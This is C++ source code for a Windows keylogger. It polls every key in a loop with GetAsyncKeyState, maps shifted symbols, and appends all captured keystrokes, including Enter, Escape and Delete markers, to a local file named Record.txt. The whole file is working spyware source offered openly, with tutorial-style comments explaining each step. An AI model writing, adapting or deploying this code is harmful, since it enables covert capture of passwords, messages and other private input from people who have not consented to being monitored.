#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

void KeyLogger(void)
{
    char character;

    while (true) // used for infinite loop
    {
        for (character = 8; character <= 222; character++)
        {
            /*
                 The range 8 to 222 covers a wide range of keys including:

                   - Numeric keys (0-9)
                   - Alphabet keys (A-Z)
                   - Function keys (F1-F12)
                   - Control keys (Shift, Ctrl, Alt, etc.)
                   - Punctuation keys and other special characters.

            */
            /*
                When a key is pressed there is a system interrupt
                That interrupt can represent the number
                i.e.; 32767
            */
            if (GetAsyncKeyState(character) == -32767)
            {
                // GetAsyncKeyState checks if a specific key was pressed.
                // -32767 indicates a key press event.
                std::ofstream write("Record.txt", std::ios::app); // ios::app ensures that the file is opened in append mode.

                if (character > 64 && character < 91 && !GetAsyncKeyState(0x10))
                {
                    // 0x10 is the hexadecimal notation for the "Shift" key
                    character += 32;
                    write << character;
                }

                else if (character > 64 && character < 91)
                {
                    write << character;
                }

                switch (character)
                {
                    case 45:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "_";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 48:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << ")";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 49:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "!";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 50:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "@";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 51:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "#";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 52:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "$";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 53:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "%";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 54:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "^";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 55:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "&";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 56:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "*";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 57:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "(";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 61:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "+";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 8: // 8 means backspace.
                    {
                        write << "\b";
                    }
                    break;
                    case 13: // 13 is for tthe "Enter Key"
                    {
                        write << " <Enter> " << std::endl;
                    }
                    break;
                    case 27: // 27 is for the "Escape key"
                    {
                        write << " <ESC> ";
                    }
                    break;
                    case 32: // 32 is for the "Space key"
                    {
                        write << " ";
                    }
                    break;
                    case 127: // 127 is for the "Delete key"
                    {
                        write << " <Delete> ";
                    }
                    break;
                }
            }
        }
    }
}

int main(void)
{
    KeyLogger();
}
